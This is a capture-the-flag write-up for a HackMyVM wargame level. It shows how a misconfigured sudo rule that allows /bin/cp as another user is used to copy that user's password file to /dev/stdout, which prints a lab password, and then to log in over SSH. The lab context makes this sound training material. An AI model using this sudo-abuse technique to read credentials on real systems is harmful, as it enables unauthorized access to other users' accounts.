# 0x08
This write-up explains the steps taken to complete mission 0x08 on hades@hackmyvm.eu, starting from user `ariadne` and escalating to ``.

## Mission
As usual, we read the mission:
```bash
ariadne@hades:~$ cat mission.txt 
################
# MISSION 0x08 #
################

## EN ##
The user arete lets us use cp on her behalf. 
```
The mission for this stage focused on the `cp` utility.

## Method of solving (Exploiting Sudo Privileges on `cp`)
Checking the available privileges with `sudo -l`, we discover that user `ariadne` was permitted to run `/bin/cp` as the user `arete` without a password.
```bash
ariadne@hades:~$ sudo -l
Matching Defaults entries for ariadne on hades:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User ariadne may run the following commands on hades:
    (arete) NOPASSWD: /bin/cp
```
Since we have the power to copy files as `arete`, we can read her private password file by copying it to a location we control or by outputing it directly to the terminal.

### Step 1: Locating the Password.
A search for files conataining `arete` revealed the location of the password file in a non-standard directory.
```bash
ariadne@hades:~$ find / -name "*arete_pass*" 2>/dev/null
/run/lock/arete_pass.txt
```

### Step 2: Reading the File 
Although we initially tried copying the file into `/tmp`, a much simpler approach using `cp` was to copy the target file to `/dev/stdout`. This prints the file's contents directly to the screen.
```bash
ariadne@hades:~$ sudo -u arete /bin/cp /run/lock/arete_pass.txt /dev/stdout
QjrIovHacmGWxVjXRLmA
```
**Explanation**:
- **Sudo** with `-u`: The sudo command allows a user to execute a command as another user. By specifying `-u arete`, I invoked the `cp` command with Arete's identity.
- **Privileged File Access**: The file /run/lock/arete_pass.txt was only readable by root or arete. Using `sudo` allowed me to bypass the restriction.
- **/dev/stdout**: In Linux, everything is a file. Copying a file to `/dev/stdout` is a clever way to "read" it using a program that is usually meant for writing, as the output is redirected to the terminal window.

Using the identified password, we successfully logged in via SSH to establish a clean session as `arete`.
```bash
ariadne@hades:~$ ssh arete@localhost
...
arete@localhost's password: 
...                  
arete@hades:~$ id ; whoami
uid=2050(arete) gid=2050(arete) groups=2050(arete)
arete
```

## Key command
